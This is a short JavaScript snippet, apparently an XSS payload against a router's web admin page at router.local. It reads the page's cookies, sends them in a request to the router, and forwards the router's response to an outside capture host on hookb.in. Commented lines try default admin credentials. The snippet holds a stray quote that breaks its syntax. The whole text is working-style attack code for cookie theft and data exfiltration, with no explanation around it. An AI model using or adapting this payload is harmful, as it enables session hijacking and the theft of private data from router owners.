const http = new XMLHttpRequest();
//http.open('POST', 'http://router.local/login.php', true);
//http://router.local/home.php?action=view&
//http://router/local/view.php
const cook = document.cookie;
http.open('POST', 'http://router.local/home.php?action=http://router.local/view&'+cook', true);

http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

http.onload = function () {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://hookb.in/LgYMBKwEmKF18VqqgpKP', true);
                xhr.setRequestHeader('Content-type', 'application/json');
                xhr.send(JSON.stringify(http.responseText));

};

http.send();
//http.send(cook+"&username=admin&pin=admin&notRobot=on");

   

